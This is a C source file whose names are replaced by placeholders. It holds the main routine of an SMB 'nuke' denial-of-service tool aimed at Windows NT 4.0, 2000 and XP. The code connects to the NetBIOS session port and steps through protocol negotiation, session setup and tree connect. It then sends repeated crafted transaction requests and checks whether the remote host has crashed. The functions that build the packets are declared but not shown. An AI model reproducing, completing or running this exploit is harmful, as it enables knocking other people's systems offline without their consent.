
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct timeval {unsigned int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {scalar_t__ error_class; } ;
typedef TYPE_1__ smb_header ;
typedef int fd_set ;
typedef int buffer ;


 int FUNC_0 (int,int *) ;
 int FUNC_1 (int *) ;



 unsigned int VAR_0 ;

 void* FUNC_2 (char*) ;
 int FUNC_3 (int) ;
 char* FUNC_4 (char*) ;
 int FUNC_5 (int ,char*,...) ;
 int FUNC_6 (int,char**,char*) ;
 char* FUNC_7 (unsigned char*,int,char*,unsigned short,unsigned int) ;
 int FUNC_8 (unsigned char*,int) ;
 char* VAR_1 ;
 int VAR_2 ;
 int FUNC_9 () ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,unsigned char*,int) ;
 int FUNC_12 (int,char*) ;
 int FUNC_13 (unsigned char*,int) ;
 int FUNC_14 (unsigned char*,int) ;
 int FUNC_15 (unsigned char*,int,char*) ;
 int FUNC_16 (int,int *,int *,int *,struct timeval*) ;
 int FUNC_17 (int ) ;
 int VAR_3 ;
 int FUNC_18 (char*,unsigned short) ;
 int FUNC_19 (int *) ;

int
FUNC_20 (int VAR_4, char **VAR_5)
{
  int VAR_6, VAR_7, VAR_8, VAR_9;
  unsigned char VAR_10[1024 * 4];
  char *VAR_11 = ((void*)0), *VAR_12 = ((void*)0);

  unsigned int VAR_13 = 0;

  unsigned int VAR_14 = 10;
  unsigned int VAR_15;

  unsigned int VAR_16 = 10;
  unsigned int VAR_17 = 10;

  unsigned short VAR_18 = 139;
  unsigned short VAR_19 = 137;

  fd_set VAR_20;
  struct timeval VAR_21;

  FUNC_17 (FUNC_19 (((void*)0)));

  FUNC_9 ();

  while ((VAR_9 = FUNC_6 (VAR_4, VAR_5, "N:n:p:P:t:T:h")) != -1)
    {
      switch (VAR_9)
        {
        case 'N':
          VAR_12 = VAR_1;
          break;
        case 'n':
          VAR_14 = FUNC_2 (VAR_1);
          break;
        case 'p':
          VAR_19 = FUNC_2 (VAR_1);
          break;
        case 'P':
          VAR_18 = FUNC_2 (VAR_1);
          break;
        case 't':
          VAR_16 = FUNC_2 (VAR_1);
          break;
        case 'T':
          VAR_17 = FUNC_2 (VAR_1);
          break;
        case 'h':
        default:
          VAR_13 = 1;
          break;
        }
    }

  if (VAR_2 < VAR_4)
   VAR_11 = VAR_5[VAR_2++];

  if (VAR_13 || VAR_11 == ((void*)0))
    {
      FUNC_10 ("Usage: %s [options] hostname/ip...\n", VAR_5[0]);
      FUNC_10
        ("   -N [netbios-name]         Netbios Name (default: ask the remote host)\n");
      FUNC_10
        ("   -n [packets]              Number of crafted packets to send (default: %d)\n",
         VAR_14);
      FUNC_10
        ("   -p [netbios-ns port]      UDP Port to query (default: %d)\n",
         VAR_19);
      FUNC_10
        ("   -P [netbios-ssn port]     TCP Port to query (default: %d)\n",
         VAR_18);
      FUNC_10
        ("   -t [udp-timeout]          Timeout to wait for receive on UDP ports (default: %d)\n",
         VAR_16);
      FUNC_10
        ("   -T [tcp-timeout]          Timeout to wait for receive on TCP ports (default: %d\n",
         VAR_17);
      FUNC_10 ("\n");
      FUNC_10 ("Known vulnerable systems: \n");
      FUNC_10 ("    - Windows NT 4.0 Workstation/Server\n");
      FUNC_10 ("    - Windows 2000 Professional/Advanced Server\n");
      FUNC_10 ("    - Windows XP Professional/Home edition\n\n");
      FUNC_3 (1);
    }

  if (!VAR_12
      && (VAR_12 =
          FUNC_7 (VAR_10, sizeof (VAR_10), VAR_11,
                              VAR_19, VAR_16)) == ((void*)0))
    FUNC_3 (1);
  else
    VAR_12 = FUNC_4 (VAR_12);

  FUNC_10 ("Using netbios name: %s\n", VAR_12);

  FUNC_10 ("Connecting to remote host (%s:%d)...\n", VAR_11,
          VAR_18);

  VAR_6 = FUNC_18 (VAR_11, VAR_18);

  if (VAR_6 == -1)
    FUNC_3 (1);


  FUNC_1 (&VAR_20);
  FUNC_0 (VAR_6, &VAR_20);

  VAR_21.tv_sec = VAR_17;
  VAR_21.tv_usec = 0;

  VAR_15 = 130;

  FUNC_12 (VAR_6, VAR_12);

  for (;;)
    {
      if (!FUNC_16 (VAR_6 + 1, &VAR_20, ((void*)0), ((void*)0), &VAR_21))
        {
          if (VAR_15 == VAR_0)
            {
              FUNC_5 (VAR_3,
                       "Timeout during TCP read - Seems like the remote host has crashed\n");
              return 0;
            }
          else
            {
              FUNC_5 (VAR_3,
                       "Nuke failed (tcp timeout) at state %#02x, exiting...\n",
                       VAR_15);
              return 1;
            }
        }

      VAR_7 = FUNC_11 (VAR_6, VAR_10, sizeof (VAR_10));

      if (VAR_7 == 0)
        {
          FUNC_10
            ("Nuke failed at state %#02x (EOF, wrong netbios name ?), exiting...\n",
             VAR_15);
          FUNC_3 (1);
        }

      if (((smb_header *) (VAR_10 + 4))->error_class != 0)
        {
          FUNC_5 (VAR_3, "Nuke failed at state %#02x, exiting...\n", VAR_15);
          FUNC_3 (1);
        }

      switch (VAR_15)
        {
        case 130:
          FUNC_10 ("Negotiating protocol...\n");
          FUNC_8 (VAR_10, VAR_6);
          break;
        case 131:
          FUNC_10 ("Requesting session setup (AndX)\n");
          FUNC_13 (VAR_10, VAR_6);
          break;
        case 129:
          FUNC_10 ("Requesting tree connect (AndX)\n");
          FUNC_15 (VAR_10, VAR_6, VAR_12);
          break;
        case 128:
          for (VAR_8 = 0; VAR_8 < VAR_14; VAR_8++)
            {
              FUNC_10 ("Requesting transaction (nuking) #%d\n", VAR_8 + 1);
              FUNC_14 (VAR_10, VAR_6);
            }
     FUNC_10 ("Wait...\n");
          break;
        default:
          FUNC_10 ("Seems like the nuke failed :/ (patched ?)\n");
   FUNC_3 (1);
        }

      VAR_15++;
    }

  return 0;
}
